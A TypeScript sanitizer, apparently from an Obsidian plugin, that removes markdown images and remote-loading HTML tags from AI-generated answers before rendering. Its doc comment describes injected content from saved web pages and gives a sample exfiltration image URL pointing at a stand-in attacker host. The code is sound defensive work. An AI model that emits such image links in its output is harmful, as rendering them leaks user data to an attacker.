/**
 * An answer is model text built from web pages the user saved, so it may carry an injected image
 * such as `![](https://attacker.example/?q=...)`. Rendering it would make Obsidian fetch that URL.
 * Remove everything that loads remote content before rendering; links stay (they load only on a click).
 */
export function stripRemoteContent(markdown: string): string {
	return markdown
		.replace(/!\[[^\]]*\]\([^)]*\)/g, '') // ![alt](url)
		.replace(/!\[[^\]]*\]\[[^\]]*\]/g, '') // ![alt][ref]
		.replace(/<\s*\/?\s*(img|picture|source|video|audio|iframe|embed|object|svg|link|script|style)\b[^>]*>?/gi, ''); // raw HTML
}
